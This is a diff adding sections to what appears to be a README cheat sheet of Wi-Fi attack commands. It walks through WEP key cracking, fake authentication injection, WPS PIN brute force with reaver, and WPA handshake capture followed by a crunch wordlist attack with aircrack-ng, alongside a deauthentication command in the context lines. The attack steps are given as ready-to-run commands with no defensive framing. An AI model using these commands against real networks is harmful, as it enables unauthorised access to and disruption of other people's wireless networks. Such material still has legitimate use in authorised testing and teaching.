@@ -47,6 +47,69 @@ Disconnect any client form any network
 ```bash
 aireplay-ng --dauth <NumOfPackets> -a <NetworkMacaddress> -c <TargetClientMacAddress> -e <WifiNname> <iterface-wlan0>
 ```
+## WEP Cracking
+
+1. Capture a large number of packets with airodump-ng
+```bash
+airodump-ng --bssid _____ --channel _ --write _test_ wlan0 
+```
+2. Analyse the captured packets and crack the key with aircrack-ng
+```bash
+aircrack-ng .capfile
+```
+3. output: KEY IS FOUND
+4. Remove the colons from the key and use it as password
+
+## Fake Authentication Attack
+
+```bash
+aireplay-ng --fakeauth 0 -a <TargetMacAddress> -h <WirelessAdapterMacAddress> <interface>
+```
+**NOTE: Type "ifconfig" to view wireless adapter mac address (unspec ---> first 12 digits)**
+
+This attack injects packets in the network.
+
+## WPA/WPA2
+If WPS is Enable:
+1. Displays networks with WPS enabled
+```bash 
+wash --interface wlan0
+```
+2. 
+```bash
+aireplay-ng --fakeauth <30> -a <TargetMacAddress> --interface <wlan0>
+```
+3. Run Reaver in another terminal window
+```bash
+reaver --bssid <TargetMacAddress> --channel <TargetChannel> --interface <wlan0> -vvv --no-associate
+```
+**NOTE: if bug error, then download older version of reaver and run ./reaver _______ **
+
+4. Results: WPS PIN and WPA PSK
+
+If WPS is disable:
+1. Capture Handshake between devices
+```bash
+airodump-ng --bssid <TargetMacAddress> --channel <Channel> --write <handshake> <wlan0>
+```
+- Wait for the handshake
+- wait for a new client or disconnect a client with a fake auth attack. 
+- WPA handshake stored in the file 
+
+- Create a wordlist
+```bash 
+crunch [min][max][characters] -T[pattern] -o [FileName]
+```
+Exampel:
+```bash
+crunch 6 8 abc12 -o test.txt
+```
+2. Wordlist attack 
+```bash
+aircrack-ng <handshake.cap> -w <text.txt>
+```
+
+
 
 
 ## Contributing
